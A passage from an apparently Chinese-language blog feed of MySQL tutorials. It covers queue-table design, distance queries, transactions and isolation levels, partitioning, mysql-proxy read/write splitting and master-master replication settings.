id FROM users_archived WHERE id = 123;</span><br><span class="line">-- 用一个偷懒的UINON查询来抑制这样的数据返回，当第一个表中没有数据时，我们才在第二个表中查询。一旦在第一个表中找到记录，就定义一个变量@found，通过在结果列中做一次赋值来实现，然后将赋值放在函数GREATEST中来避免返回额外的数据。为了明确结果来自哪一个表，新增了一个包含表名的列。最后需要在查询的末尾将变量重置为NULL，保证遍历时不干扰后面的结果。</span><br><span class="line">SELECT GREATEST(@found := −1, id) AS id, <span class="string">'users'</span> AS which_tbl</span><br><span class="line">FROM users WHERE id = 1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT id, <span class="string">'users_archived'</span></span><br><span class="line">FROM users_archived WHERE id = 1 AND @found IS NULL</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT 1, <span class="string">'reset'</span> FROM DUAL WHERE ( @found := NULL ) IS NOT NULL;</span><br></pre></td></tr></table></figure></li><li><p>用户自定义变量的其他用处：</p><ul><li>不仅是在SELECT语句中，在其他任何类型的SQL语句中都可以对变量进行赋值。例如，可以像前面使用子查询的方式改进排名语句一样来改进UPDATE语句。</li><li>有时需要使用一些技巧来获得希望的结果。因为优化器可能会把变量当作一个编译时常量来对待，而不是对其进行赋值。将函数放在类似LEAST()这样的函数中通常可以避免这样的问题。另一个办法是在查询被执行前检查变量是否被赋值。</li></ul></li><li><p>其他用法：</p><ul><li>查询运行时计算总数和平均值</li><li>模拟GROUP语句中的函数FIRST()和LAST()</li><li>对大量数据做一些数据计算。</li><li>计算一个大表的MD5散列值</li><li>编写一个样本处理函数，当样本中的数值超过某个边界值的时候将其变为0</li><li>模拟读/写游标</li><li>在SHOW语句的WEHRE子句中加入变量值。</li></ul></li></ul><h2 id="案例学习"><a href="#案例学习" class="headerlink" title="案例学习"></a>案例学习</h2><h3 id="使用MySQL构建一个队列表"><a href="#使用MySQL构建一个队列表" class="headerlink" title="使用MySQL构建一个队列表"></a>使用MySQL构建一个队列表</h3><p>使用MySQL来实现对列表是一个取巧的做法，很多系统在高流量、高并发的情况下表现并不好。典型的模式是一个表包含多种类型的记录：未处理记录、已处理记录、正在处理的记录等等。一个或者多个消费者线程在表中查找未处理的记录，然后声称正在处理，当处理完成后，再将记录更新为已处理状态。一般的，例如邮件发送、多命令处理、评论修改等会使用类似模式，但</p><p>原有处理方式不合适的原因：</p><ul><li>随着对列表越来越大和索引深度的增加，找到未处理记录的速度会随之变慢。</li><li>一般的处理过程分两步，先找到未处理的记录然后加锁。找到记录会增加服务器的压力，而加锁操作则会让各个消费者进程增加竞争，因为这是一个串行化操作。</li></ul><p>优化过程：</p><ul><li>将对列表分成两部分，即将已处理记录归档或者存放到历史表，这样始终保证对列表很小。</li><li><p>找到未处理记录一般来说都没问题，如果有问题则可以通过使用消息方式来通知各个消费者。</p><ul><li>可已使用一个带有注释的SLEEP()函数做超时处理。这让线程一直阻塞，直到超时或者另一个线程使用KILL QUERY结束当前的SLEEP。因此，当再向对列表中新增一批数据后，可以通过<code>SHOW PROCESSLIST</code>，根据注释找到当前正在休眠操作的线程，并将其KILL。可以使用函数GET_LOCK和RELEASE_LOCK()来实现通知，或者可以在数据库之外实现，如使用一个消息服务。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /* waiting on unsent_emails */ SLEEP(10000), col1 FROM table;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>最后一个问题是如何让消费者标记正在处理的记录，而不至于让多个消费者重复处理一个记录。</p><ul><li>尽量避免使用SELECT FOR UPDATE，这通常是扩展性问题的根源，这会导致大量的书屋阻塞并等待。不光是队列表，任何情况下都要避免。</li><li>可以直接使用UPDATE来更新记录，然后检查是否还有其他的记录需要处理。(所有的SELECT FOR UPDATE都可以使用类似的方式改写)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-- 该表的owner用来存储当前正在处理这个记录的连接ID，即由函数CONNECTION_ID()返回额ID，如果当前记录没有被任何消费者处理，则该值为0</span><br><span class="line">CREATE TABLE unsent_emails ( </span><br><span class="line">   id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,    </span><br><span class="line">-- columns <span class="keyword">for</span> the message, from, to, subject, etc.   </span><br><span class="line"> status ENUM(<span class="string">'unsent'</span>, <span class="string">'claimed'</span>, <span class="string">'sent'</span>),   </span><br><span class="line"> owner INT UNSIGNED NOT NULL DEFAULT 0,   </span><br><span class="line"> ts TIMESTAMP,   </span><br><span class="line"> KEY (owner, status, ts));</span><br><span class="line">-- 常见的处理办法。这里的SELECT查询使用到索引的两个列，理论上查找的效率应该更快。问题是，两个查询之间的“间隙时间”，这里的锁会让所有其他同一的查询全部被阻塞。所有这样的查询将使用相同的索引，扫描索引相同结果的部分，所以很可能被阻塞。</span><br><span class="line">BEGIN;</span><br><span class="line">SELECT id FROM unsent_emails </span><br><span class="line">   WHERE owner = 0 AND status = <span class="string">'unsent'</span>  </span><br><span class="line">  LIMIT 10 FOR UPDATE;</span><br><span class="line">-- result: 123, 456, 789</span><br><span class="line">UPDATE unsent_emails</span><br><span class="line">    SET status = <span class="string">'claimed'</span>, owner = CONNECTION_ID()</span><br><span class="line">    WHERE id IN(123, 456, 789);</span><br><span class="line">COMMIT;</span><br><span class="line">-- 改进后更高效的写法,无须使用SELECT查询去找到哪些记录还没有被处理。客户端的协议会告诉你更新了几条记录，所以可以直到这次需要处理多少条记录。</span><br><span class="line">SET AUTOCOMMIT = 1;</span><br><span class="line">COMMIT;</span><br><span class="line">UPDATE unsent_emails</span><br><span class="line">    SET status = <span class="string">'claimed'</span>, owner = CONNECTION_ID() </span><br><span class="line">   WHERE owner = 0 AND status = <span class="string">'unsent'</span>  </span><br><span class="line">  LIMIT 10;</span><br><span class="line">SET AUTOCOMMIT = 0;</span><br><span class="line">SELECT id FROM unsent_emails</span><br><span class="line">    WHERE owner = CONNECTION_ID() AND status = <span class="string">'claimed'</span>;</span><br><span class="line">-- result: 123, 456, 789</span><br></pre></td></tr></table></figure></li></ul></li><li><p>最后还需处理一种特殊情况：那些正在被进程处理，而进程本身却由于某种原因退出的情况。</p><ul><li>只需要定期运行UPDATE语句将它都更新成原始状态，然后执行SHOW PROCESSLIST，获取当前正在工作的线程ID，并使用一些WHERE条件避免取到那些刚开始处理的进程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 假设获取的线程ID有(10、20、30),下面的更新语句会将处理时间超过10分钟的记录状态更新成初始状</span><br><span class="line">-- 将范围条件放在WHERE条件的末尾，这个查询恰好能勾使用索引的全部列，其它的查询也都能使用上这个索引，这样就避免了再新增一个额外的索引来满足其它的查询</span><br><span class="line">UPDATE unsent_emails</span><br><span class="line">    SET owner = 0, status = <span class="string">'unsent'</span></span><br><span class="line">  WHERE owner NOT IN(0, 10, 20, 30) AND status = <span class="string">'cla    </span></span><br><span class="line"><span class="string">AND ts &lt; CURRENT_TIMESTAMP - INTERVAL 10 MINUTE;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>该案例中的一些基础原则：</strong></p><ul><li>尽量少做事，可以的话就不要做任何事。除非不得已，否则不要使用轮询，因为这会增加负载，而且还会带来很多低产出的工作。</li><li>尽可能快地完成需要做的事情。尽量使用UPDATE代替先SELECT FOR UPDATE再UPDATE的写法，因为事务的提交的速度越快，持有的锁时间就越短，可以大大减少竞争和加速串行执行效率。将已经处理完成和未处理的数据分开，保证数据集足够小。</li><li><p>这个案例的另一个启发是，某些查询是无法优化的；考虑使用不同的查询或者不同的策略去实现相同的目的。通常对于SELECT FOR UPDATE就需要这样的处理</p><p>有时，最好的办法就是将任务队列从数据库中迁移出来，Redis和memcached就是一个很好的队列容器。</p></li></ul><h3 id="6-8-2-计算两点之间的距离"><a href="#6-8-2-计算两点之间的距离" class="headerlink" title="6.8.2 计算两点之间的距离"></a>6.8.2 计算两点之间的距离</h3><p>不建议使用MySQL做太复杂的空间计算存储，PostgreSQL在这方面是一个不错的选择。一个典型的例子是计算以某个点为中心，一定半径内的所有点。例如查找某个点附近所有可以出租的房子，或者社交网站中”匹配“附近的用户。</p><p>假设我们有如下表，这里经度和纬度的单位都是度：</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE locations ( </span><br><span class="line"> id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">  name VARCHAR(30), </span><br><span class="line"> lat FLOAT NOT NULL,</span><br><span class="line"> lon FLOAT NOT NULL);</span><br><span class="line">INSERT INTO locations(name, lat, lon) </span><br><span class="line"> VALUES(<span class="string">'Charlottesville, Virginia'</span>, 38.03, −78.48), </span><br><span class="line"> (<span class="string">'Chicago, Illinois'</span>, 41.85, −87.65), </span><br><span class="line"> (<span class="string">'Washington, DC'</span>, 38.89, −77.04);</span><br></pre></td></tr></table></figure><p>假设地球是圆的，然后使用两点所在最大圆(半正矢)公式来计算两点之间的距离。现有坐标latA和lonA、latB和lonB，那么点A和点B的距离计算公式如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ACOS(</span><br><span class="line">COS(latA) * COS(latB) * COS(lonA - lonB)</span><br><span class="line">+ SIN(latA) * SIN(latB)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>计算的结果是一个弧度，如果要将结果转换成英里或千米，则需要乘以地球的半径。</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM locations WHERE 3979 * ACOS(</span><br><span class="line">  COS(RADIANS(lat)) * COS(RADIANS(38.03)) * COS(RADIANS(lon) - RADIANS(-78.48))</span><br><span class="line">  + SIN(RADIANS(lat)) * SIN(RADIANS(38.03))) &lt;= 100;</span><br></pre></td></tr></table></figure><p>这类查询不仅无法使用索引，而且还会非常消耗CPU时间，给服务器带来很大的压力，而且还得反复计算。</p><p>优化地方：</p><ul><li><p>看看是否真的需要这么精确的计算。其实该算法已经有很多不精确的地方：</p><ul><li>直线距离可能是100英里，但实际上它们之间的行走距离很可能不是这个值。</li><li>如果根据邮政编码来确定某个人所在的地区，再根据这个地区的中心位置计算他和别人的距离，这本身就是一个估算。</li></ul></li><li><p>如果不需要太高的精度，可以认为地球是圆的。<strong>要想有更多的优化，可以将三角函数的计算放到应用中，而不要在数据库中计算。*</strong>   看看是否真需要计算一个圆周，可以考虑直接使用一个正方形代替。边长为200英里的正方形，一个顶点到中心的距离大概是141英里，这和实际计算的100英里相差并不太远。根据正方形公式来计算弧度为0.0253(100英里)的中心到边长的距离：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM locations </span><br><span class="line"> WHERE lat BETWEEN 38.03 - DEGREES(0.0253)</span><br><span class="line"> AND 38.03 + DEGREES(0.0253)  AND lon BETWEEN −78.48 - DEGREES(0.0253) </span><br><span class="line">AND −78.48 + DEGREES(0.0253);</span><br></pre></td></tr></table></figure><p>现在看看如何用索引来优化这个查询：</p></li><li><p>增加索引(lat, lon)，这样做的效果并不会很好，因为使用了范围查询。</p></li><li><p>使用IN()优化。</p><p>新增两个列，用来存储坐标的近似值FLOOR()，然后在查询中使用IN()将所有点的整数值都放到列表中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE locations</span><br><span class="line">-&gt; ADD lat_floor INT NOT NULL DEFAULT 0,</span><br><span class="line">-&gt; ADD lon_floor INT NOT NULL DEFAULT 0,</span><br><span class="line">-&gt; ADD KEY(lat_floor, lon_floor);</span><br></pre></td></tr></table></figure></li></ul><p>现在可以根据坐标的一定范围的近似值来搜索，这个近似值包括地板值和天花板值，地理上分别对应的是南北:</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 查询某个范围的所有点，数值需要在应用程序中计算而不是MySQL</span><br><span class="line">mysql&gt; SELECT FLOOR( 38.03 - DEGREES(0.0253)) AS lat_lb,</span><br><span class="line">-&gt; CEILING( 38.03 + DEGREES(0.0253)) AS lat_ub,</span><br><span class="line">-&gt; FLOOR(-78.48 - DEGREES(0.0253)) AS lon_lb,</span><br><span class="line">-&gt; CEILING(-78.48 + DEGREES(0.0253)) AS lon_ub;</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">| lat_lb | lat_ub | lon_lb | lon_ub |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">| 36     | 40     | −80    | −77    |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">-- 生成IN()列表中的整数：</span><br><span class="line">SELECT * FROM locations  WHERE lat BETWEEN 38.03 - DEGREES(0.0253) </span><br><span class="line">AND 38.03 + DEGREES(0.0253)  AND lon BETWEEN −78.48 - DEGREES(0.0253) </span><br><span class="line">AND −78.48 + DEGREES(0.0253)  AND lat_floor IN(36,37,38,39,40) AND lon_floor IN(-80,-79,-78,-77);</span><br></pre></td></tr></table></figure><p>使用近似值会让我们的计算结果有偏差，所以我们还需要一些额外的条件过滤在正方形之外的点，这和前面使用CRC32做哈希索引类似：先建一个索引过滤出近似值，在使用精确条件匹配所有的记录并移除不满足条件的记录。</p><p>事实上，到这时就无须根据正方形的近似来过滤数据，可以使用最大圆公式或者毕达哥拉斯定理来计算：</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM locations</span><br><span class="line">  WHERE lat_floor IN(36,37,38,39,40) AND lon_floor IN(-80,-79,-78,-77)</span><br><span class="line">  AND 3979 * ACOS( </span><br><span class="line"> COS(RADIANS(lat)) * COS(RADIANS(38.03)) * COS(RADIANS(lon) - RADIANS(-78.48))</span><br><span class="line">  + SIN(RADIANS(lat)) * SIN(RADIANS(38.03)))</span><br><span class="line"> &lt;= 100;</span><br></pre></td></tr></table></figure><p>这时计算精度再次回到使用一个精确的圆周，不过现在的做法更快。只要能够高效地过滤掉大部分的点，例如使用近似整数和索引，之后再做精确数学计算的代价并不大。只要不是使用大圆周的算法，否则速度会更慢。</p><p>该案例使用的优化策略:</p><ul><li>尽量少做事，可能的话尽量不做事。这个案例中就不要对所有的点计算大圆周公式；先使用简单的方案过滤大多数数据，然后再到过滤出来的更小的集合上使用复杂的公式运算。</li><li>快速地完成事情。确保在设计中尽可能地让查询都用上合适的索引，使用近似计算来避免复杂计算。</li><li>需要的时候，尽可能让应用程序完成一些计算。</li></ul><h3 id="使用用户自定义函数"><a href="#使用用户自定义函数" class="headerlink" title="使用用户自定义函数"></a>使用用户自定义函数</h3><ul><li>当SQL语句已经无法高效地完成某些任务的时候，如果需要更快的速度，那么C和C++是很好的选择。</li><li><p>案例：需要根据两个随机的64位数字计算它们的XOR值，来看这两个数值是否匹配。大约有3500万条的记录需要在秒级中完成。</p><ul><li>经过简单的计算就知道，当前的硬件条件下，不可能在MySQL中完成。</li><li>编写一个计算程序，以一个后台程序的方式运行在同一服务器上，然后编写一个用户自定义函数，通过简单的网络通信协议和前面的程序进行交互。分布式运行该程序，可以达到在130毫秒内完成4百万次匹配计算。通过这样的方式，可以将密集型的计算放到一些通用服务器上，同时对外界完全透明，看起来是MySQL完成了全部的工作。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果把创建高性能应用程序比作是一个环环相扣的”难题“，除了前面介绍的schema、索引和查询语句设计之外，查询优化应该是解开”难题“的最后一步。</p><p>理解查询是如何被执行的以及时间都消耗在哪些地方，这依然是前面介绍的响应时间的一部分。再加上一些诸如解析和优化过程的知识，就可以额更进一步地理解上一章讨论的MySQL如何访问表和索引的内容了。这也从另一个维度理解MySQL在访问表和索引时查询和索引的关系。</p><p>优化通常需要三管齐下：不做、少做、快速地做。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之sql语句优化脑图</title>
      <link href="/2018/09/29/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bsql%E8%AF%AD%E5%8F%A5%E4%BC%98%E5%8C%96%E8%84%91%E5%9B%BE/"/>
      <url>/2018/09/29/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bsql%E8%AF%AD%E5%8F%A5%E4%BC%98%E5%8C%96%E8%84%91%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>sql优化脑图</p><p><img src="sql优化.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql事务</title>
      <link href="/2018/09/29/mysql%E4%BA%8B%E5%8A%A1/"/>
      <url>/2018/09/29/mysql%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>mysql事务通俗理解<br><a id="more"></a></p><h1 id="事务的4个特性-ACID"><a href="#事务的4个特性-ACID" class="headerlink" title="事务的4个特性:ACID"></a>事务的4个特性:ACID</h1><p>原子性(Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）</p><p>以银行汇款为例,张三给李四转款300元.</p><ul><li><p>原子性:</p><p>是指某几句sql的影响,要么都发生,要么都不发生.</p><pre><code>即:张三减300, 李四+300 , insert银行流水, 这3个操作,必须都完成,或都不产生效果.</code></pre></li><li><p>一致性:</p><p>事务前后的数据,保持业务上的合理一致.<br>   (汇款前)张三的余额+李四的余额  ====== (汇款后) 张三的余额+李四余额<br>   比如: 张三只有280元, 280-300=-20,储蓄卡不是信用卡,不能为负,因此张三余0元.<br>   将导致, 汇款后,2者余额,汇款前,差了20元.</p></li><li><p>隔离性:</p><p>在事务进行过程中, 其他事务,看不到此事务的任何效果.<br>持久性: 事务一旦发生,不能取消. 只能通过补偿性事务,来抵消效果.</p></li></ul><h1 id="事务与引擎"><a href="#事务与引擎" class="headerlink" title="事务与引擎:"></a>事务与引擎:</h1><p>myisam引擎不支持事务, innodb和BDB引擎支持.<br>因此我们的实验用innodb表来做</p><h1 id="事务的使用流程"><a href="#事务的使用流程" class="headerlink" title="事务的使用流程:"></a>事务的使用流程:</h1><p>比较简单:<br>开启事务   start transaction<br>执行查询   xxxx<br>提交事务/回滚事务. commit / rollback</p><h1 id="事务的隔离级别（重点理解）"><a href="#事务的隔离级别（重点理解）" class="headerlink" title="事务的隔离级别（重点理解）"></a>事务的隔离级别（重点理解）</h1><ul><li><p>set session transaction isolation level [read uncommitted |  read committed | repeatable read |serializable]</p></li><li><p>read uncommitted:  读未提交的事务内容,显然不符原子性, 称为”脏读”. 在业务中,没人这么用.</p></li><li><p>read commited:   在一个事务进行过程中, 读不到另一个进行事务的操作,但是,可以读到另一个结束事务的操作影响.</p></li><li><p>repeatable read: 可重复读,即在一个事务过程中,所有信息都来自事务开始那一瞬间的信息,不受其他已提交事务的影响. (大多数的系统,用此隔离级别)</p></li><li><p>serializeable 串行化  , 所有的事务,必须编号,按顺序一个一个来执行,也就取消了冲突的可能.这样隔离级别最高,但事务相互等待的等待长. 在实用,也不是很多.</p></li></ul><h1 id="设置事务的级别"><a href="#设置事务的级别" class="headerlink" title="设置事务的级别:"></a>设置事务的级别:</h1><p>set session transaction isolation level read uncommitted;</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql表分区</title>
      <link href="/2018/09/29/mysql%E8%A1%A8%E5%88%86%E5%8C%BA/"/>
      <url>/2018/09/29/mysql%E8%A1%A8%E5%88%86%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<p>分表分区<br><a id="more"></a></p><h1 id="表分区-partition"><a href="#表分区-partition" class="headerlink" title="表分区 partition"></a>表分区 partition</h1><p>当一张表的数据非常多的时候,比如单个.myd文件都达到10G, 这时,必然读取起来效率降低.<br>可不可以把表的数据分开在几张表上?</p><ul><li><p>1: 从业务角度可以解决. (分表)<br>比如, 通过id%10 , user0 , user1….user9, 这10张表<br>根据不同的余数,来插入或查询某张表.</p></li><li><p>2: 通过mysql的分区功能<br>mysql将会根据指定的规则,把数据放在不同的表文件上.<br>相当于在文件上,被拆成了小块.<br>但是,给客户的界面,还是1张表.</p></li></ul><h1 id="分区常用的规则"><a href="#分区常用的规则" class="headerlink" title="分区常用的规则"></a>分区常用的规则</h1><p>常用的规则:<br>根据某列的范围来分区, 也可以某列的散点值来分区.</p><ul><li>示例: 按列的范围来分区<br>以用户表为例, uid<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uid [1,10)  ---&gt; user partition u0</span><br><span class="line">uid[10, 20) ---&gt; user partition u1</span><br><span class="line">uid [20, MAX] --&gt; user partion u2</span><br></pre></td></tr></table></figure></li></ul><h2 id="range分区"><a href="#range分区" class="headerlink" title="range分区"></a>range分区</h2><ul><li>分区 按range分区</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create table goods (</span><br><span class="line">id int,</span><br><span class="line">uname char(10)</span><br><span class="line">)engine myisam</span><br><span class="line">partition by range(id) (</span><br><span class="line">partition p1 values less than (10),</span><br><span class="line">partition p2 values less than (20),</span><br><span class="line">partition p3 values less than MAXVALUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="list分区"><a href="#list分区" class="headerlink" title="list分区"></a>list分区</h2><p>address表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pid 主键prov 省名</span><br><span class="line">1北京</span><br><span class="line">2安徽</span><br><span class="line">...</span><br><span class="line">35西藏</span><br></pre></td></tr></table></figure></p><p>user表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user 表,想按省来分区,</span><br><span class="line">uid 主键pid 省份uname 用户名</span><br><span class="line">11张北京</span><br></pre></td></tr></table></figure></p><p>使用list分区<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create table user (</span><br><span class="line">uid int,</span><br><span class="line">pid int,</span><br><span class="line">uname </span><br><span class="line">)engine myisam</span><br><span class="line">partition by list(pid) (</span><br><span class="line">partition bj values <span class="keyword">in</span> (1),</span><br><span class="line">partition ah values <span class="keyword">in</span> (2),</span><br><span class="line">partition xb values <span class="keyword">in</span> (4,5,6)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>注意: 在使用分区的时候,注意,分区的那个列,值不要为NULL<br>(如果不小心为NULL,mysql为理解为0,尽量执行之)</p><p>注 :分区甚至可以按照表达式的返回值,计算所属区.<br>但用表达式,不如直接用值来得快. 根据情况而定.</p><p>比如,用 partition by range (year(regtime)) 可以按注册年份来分区.</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql主从读写分离</title>
      <link href="/2018/09/29/mysql%E4%B8%BB%E4%BB%8E%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB/"/>
      <url>/2018/09/29/mysql%E4%B8%BB%E4%BB%8E%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB/</url>
      
        <content type="html"><![CDATA[<p>读写分离原来这么简单！！！<br><a id="more"></a></p><h1 id="下载mysql-proxy中间"><a href="#下载mysql-proxy中间" class="headerlink" title="下载mysql_proxy中间"></a>下载mysql_proxy中间</h1><p>下载安装mysql_proxy:<br><a href="http://mysql.cdpa.nsysu.edu.tw/Downloads/MySQL-Proxy/mysql-proxy-0.8.3-linux-glibc2.3-x86-64bit.tar.gz" target="_blank" rel="noopener">http://mysql.cdpa.nsysu.edu.tw/Downloads/MySQL-Proxy/mysql-proxy-0.8.3-linux-glibc2.3-x86-64bit.tar.gz</a></p><p>解压后, 该目录包含已经编译好的二进制文件 .</p><h1 id="测试下所谓的负载均衡"><a href="#测试下所谓的负载均衡" class="headerlink" title="测试下所谓的负载均衡"></a>测试下所谓的负载均衡</h1><p>1: 利用mysql_proxy实现负载均衡<br>执行mysql_proxy<br>./mysql-proxy-path/bin/mysql-proxy \<br>–proxy-backend-addresses=192.168.1.199:3306 \<br>–proxy-backend-addresses=192.168.1.200:3306</p><p>2: 连接mysql_proxy,用mysql客户就可以,因为proxy是mysql的前端代理<br>注意proxy的端口是4040<br>mysql -h “proxy的IP” -P 4040 -u username -p password</p><p>在连接上之后,做sql查询,却总是往某1台mysql server来发送——负载均衡没体现出来?<br>答: 不是没体现出来.<br>均衡不是体现在sql语句,一会请求mysqlA服,一会请求mysqlB服.<br>均衡是体现”连接”的均衡上.,</p><p>mysql_proxy会把连接mysql服务器的tcp/IP连接缓存进连接池,以提高性能.<br>在缓存池里, 缓存的连接大致是平均分配在每台mysql服务器上.<br>但具体的每一个连接,始终连某台服务器.</p><h1 id="读写分离配置"><a href="#读写分离配置" class="headerlink" title="读写分离配置"></a>读写分离配置</h1><p>简写:<br>./bin/mysql-proxy -b=192.168.0.199:3306 -r=192.168.0.200:3306 -s=/usr/local/mysql-proxy/share/doc/mysql-proxy/rw-splitting.lua  </p><p>这么简单就搞定了….</p><h1 id="参考详细配置"><a href="#参考详细配置" class="headerlink" title="参考详细配置"></a>参考详细配置</h1><p><a href="https://www.cnblogs.com/phpstudy2015-6/p/6687480.html#_label3" target="_blank" rel="noopener">mysql读写分离</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql主主复制</title>
      <link href="/2018/09/29/mysql%E4%B8%BB%E4%B8%BB%E5%A4%8D%E5%88%B6/"/>
      <url>/2018/09/29/mysql%E4%B8%BB%E4%B8%BB%E5%A4%8D%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>了解完主从复制，主主复制就更简单了<br><a id="more"></a></p><h1 id="主主复制"><a href="#主主复制" class="headerlink" title="主主复制"></a>主主复制</h1><p>在上面的配置中,2台服务器地位有差别,一主一从.<br>从服务器一是起到备份作用,一是起到分担查询压力的作用.</p><p>接下来的配置,2台服务器之间,没有明显的地位差距, 两者可以同步对方的内容.<br>一般的格局如下图:<br>两台服务器相互复制</p><p><img src="主主复制.png" alt=""></p><h1 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h1><p>大致思路:<br>1: 2台服务器都设置上2进制日志和relay日志<br>2: 都设置上replcation账号<br>3: 都设置对方为自己的master</p><h1 id="实战配置"><a href="#实战配置" class="headerlink" title="实战配置"></a>实战配置</h1><p>可参考这篇<a href="https://www.cnblogs.com/phpstudy2015-6/p/6485819.html#_label7" target="_blank" rel="noopener">文章</a></p><h1 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h1><p>主主复制下一定要注意避免的问题———同步冲突<br>例:<br>create table stu (<br>id int primary key auto_increment.<br>)……<br>2台mysql地位相等, 假如2个请求同时到达2台服务器,<br>请求的A节点,  stu 的id为1<br>请求的B 节点,  stu的id为1 ,<br>同步—&gt;冲突</p><p>如何解决?<br>让1台服务器  1,3,5,7来增长<br>另1台服务器  2,4,6,8来增长<br>一台服务器：<br>set global auto_increment_increment = 2;<br>set global auto_increment_offset = 1;<br>set session auto_increment_increment = 2;<br>set session auto_increment_offset = 1; </p><p>另一台服务器：<br>set global auto_increment_increment = 2;<br>set global auto_increment_offset = 